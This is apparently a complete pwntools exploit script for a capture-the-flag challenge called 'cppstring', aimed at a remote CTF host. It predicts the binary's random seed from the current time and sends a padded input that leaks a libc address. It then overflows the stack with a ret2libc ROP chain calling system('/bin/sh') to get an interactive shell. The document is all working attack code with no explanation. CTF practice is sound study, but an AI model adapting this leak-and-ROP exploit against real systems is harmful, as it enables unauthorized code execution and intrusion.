#!/usr/bin/python3

from pwn import *
from ctypes import *

exe = ELF('cppstring', checksec=False)
libc = ELF('libc.so.6', checksec=False)
glibc = CDLL('libc.so.6')
context.binary = exe

def gen_seed():
	res = (2003 * glibc.time(0) // 9) >> 2
	return res * 30213741 * glibc.rand()
	
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('pwn.battlectf.online', 1008)

glibc.srand(gen_seed() & 0xffffffff)
glibc.srand(gen_seed() & 0xffffffff)
glibc.srand(gen_seed() & 0xffffffff)
payload = str(glibc.rand()).encode().ljust(0x3a7, b'P')
p.sendline(payload)
p.recvuntil(b'P'*0x200 + b'\n')

##################################
### Stage 1: Leak libc address ###
##################################
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x8e475
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029cd6
payload = b'\0'*0x408 + flat(
	libc.address,
	0, 0, 0,
	ret,
	pop_rdi, next(libc.search(b'/bin/sh')),
	libc.sym['system']
	)
p.sendlineafter(b'winner: ', payload)

p.interactive()
